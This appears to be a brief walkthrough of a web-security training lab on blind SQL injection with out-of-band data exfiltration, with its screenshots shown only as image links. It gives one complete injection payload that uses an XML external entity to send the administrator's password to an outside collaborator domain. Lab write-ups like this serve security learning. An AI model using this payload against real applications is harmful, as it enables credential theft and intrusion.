# Lab: Blind SQL injection with out-of-band data exfiltration #

# Lab Description #

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/ac428f09-13bb-432a-8221-f8ead4073f7c)

## Target Website ##

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/cef94ec1-4d86-4191-83b5-176fbc8ba86a)

We have intercepted the request and now we will modify the request to admin password

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/10e9856c-503d-47a2-a86e-d9212043b9f2)

We will use this payload `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`

We got the password 
![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/2c80b795-962c-4b3e-b059-27a2db323408)

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/3eaa0fa1-0082-4f7f-94a1-270ab8dbb990)
